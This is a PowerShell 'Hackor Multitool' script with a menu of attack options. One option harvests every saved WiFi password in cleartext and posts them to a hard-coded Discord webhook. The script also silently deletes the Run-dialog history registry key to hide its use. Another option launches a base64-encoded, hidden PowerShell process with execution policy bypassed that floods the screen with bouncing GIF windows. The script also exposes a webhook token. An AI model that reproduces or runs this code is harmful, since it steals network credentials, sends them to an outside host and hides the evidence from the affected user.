# Define the function to show the menu
function Show-Menu {
    Clear-Host
    Write-Host @"
 ________  _______   ________  ________  _______   ________     
|\   ___ \|\  ___ \ |\   ___ \|\   ____\|\  ___ \ |\   ____\    
\ \  \_|\ \ \   __/|\ \  \_|\ \ \  \___|\ \   __/|\ \  \___|    
 \ \  \ \\ \ \  \_|/_\ \  \ \\ \ \_____  \ \  \_|/_\ \  \       
  \ \  \_\\ \ \  \_|\ \ \  \_\\ \|____|\  \ \  \_|\ \ \  \____  
   \ \_______\ \_______\ \_______\____\_\  \ \_______\ \_______\
    \|_______|\|_______|\|_______|\_________\|_______|\|_______|
                                 \|_________|                   
                                                                
                                                                
"@
    Write-Host "================ Hackor Multitool ================"
    Write-Host "1: List WiFi Passwords"
    Write-Host "2: Option Two"
    Write-Host "3: Option Three"
    Write-Host "Q: Quit"
    Write-Host "==========================================="
}

Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Force

# Define the main function that runs the menu loop
function Start-HackorMultitool {
    
    do {
        Show-Menu
        $selection = Read-Host "Please make a selection"
        switch ($selection) {
            '1' {
                Clear-Host
                Write-Host "================ Hackor Multitool -> WiFi Networks ================"
                Write-Host "Scanning saved WiFi Networks..."
                $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object {$name=$_.Matches.Groups[1].Value.Trim(); $_} | ForEach-Object {(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | ForEach-Object {$pass=$_.Matches.Groups[1].Value.Trim(); $_} | ForEach-Object {[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
                Write-Host $wifiProfiles
                Write-Host "1: Send to webhook"
                Write-Host "2: Back"
                $selection2 = Read-Host "Please make a selection"
                switch ($selection2) {
                    '1' {
                        $filePath = "$env:TEMP/--wifi-pass.txt"
                        $wifiProfiles | Out-File -FilePath $filePath
                        
                        $webhookUrl = "https://discord.com/api/webhooks/1098750753935474800/XSUW-ZgqQmr3zD9FwL1W2iwbtoDBqvX9Y-SzpR6HFQxUgRYal7YdPYjxAsxJaHz2ev7J"
                        $fileContent = Get-Content -Path $filePath -Raw
                        $payload = @{
                            content = "WiFi Passwords:`n$fileContent"
                        } | ConvertTo-Json
                        try {
                            Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
                        }
                        catch {
                            Write-Host "Failed to send data to webhook: $_"
                        }
                        finally {
                            Remove-Item -Path $filePath -ErrorAction SilentlyContinue
                        }
                    }
                    '2' {
                        # Do nothing, just go back to main menu
                    }
                }
                pause
            }
            '2' {
                Write-Host "You chose Option Two"
                $scriptBlock = {
                    Add-Type -AssemblyName System.Windows.Forms
                    Add-Type -AssemblyName System.Drawing

                    $gifCount = 0
                    $maxGifs = 20
                    $gifPath = 'C:\Users\theob\Documents\GitHub\Scripts\dan6t0z-5cc622d3-63b8-4f82-b158-0230e658e9c0.gif'
                    $forms = New-Object System.Collections.Generic.List[System.Windows.Forms.Form]

                    function Show-GifViewer {
                        if ($script:gifCount -ge $maxGifs) {
                            return
                        }

                        $form = New-Object System.Windows.Forms.Form
                        $form.Text = "GIF Viewer #$($script:gifCount + 1)"
                        $form.Size = New-Object System.Drawing.Size(300, 200)
                        $form.FormBorderStyle = 'None'
                        $form.TopMost = $true

                        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea
                        $form.StartPosition = 'Manual'
                        $form.Location = New-Object System.Drawing.Point(
                            (Get-Random -Minimum 0 -Maximum ($screen.Width - $form.Width)),
                            (Get-Random -Minimum 0 -Maximum ($screen.Height - $form.Height))
                        )

                        $pictureBox = New-Object System.Windows.Forms.PictureBox
                        $pictureBox.SizeMode = 'StretchImage'
                        $pictureBox.Dock = 'Fill'

                        if (Test-Path $gifPath) {
                            $pictureBox.Image = [System.Drawing.Image]::FromFile($gifPath)
                        } else {
                            Write-Host "GIF file not found: $gifPath"
                            return
                        }

                        $form.Controls.Add($pictureBox)

                        $form.Add_FormClosed({
                            $pictureBox.Image.Dispose()
                            $pictureBox.Dispose()
                            $forms.Remove($form)
                            $script:gifCount--
                        })

                        $forms.Add($form)
                        $form.Show()
                        $script:gifCount++

                        # Start the bouncing animation
                        $timer = New-Object System.Windows.Forms.Timer
                        $timer.Interval = 20
                        $dx = 5
                        $dy = 5

                        $timer.Add_Tick({
                            $newX = $form.Location.X + $dx
                            $newY = $form.Location.Y + $dy

                            if ($newX -le 0 -or $newX -ge ($screen.Width - $form.Width)) { 
                                $dx = -$dx 
                            }
                            if ($newY -le 0 -or $newY -ge ($screen.Height - $form.Height)) { 
                                $dy = -$dy 
                            }

                            $form.Location = New-Object System.Drawing.Point([int]$newX, [int]$newY)
                        })
                        $timer.Start()
                    }

                    $spawnTimer = New-Object System.Windows.Forms.Timer
                    $spawnTimer.Interval = 1000 # 1 second
                    $spawnTimer.Add_Tick({
                        if ($script:gifCount -lt $maxGifs) {
                            Show-GifViewer
                        } else {
                            $spawnTimer.Stop()
                        }
                    })
                    $spawnTimer.Start()

                    [System.Windows.Forms.Application]::Run()
                }

                $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($scriptBlock))
                Start-Process powershell -ArgumentList "-NoProfile", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-EncodedCommand", $encodedCommand
                pause
            }
            '3' {
                Write-Host "You chose Option Three"
                pause
            }
            'q' {
                return
            }
        }
    } while ($selection -ne 'q')
}

# Run the main function
Start-HackorMultitool

# To make this script runnable from the Windows Run command, add this line at the end:
pause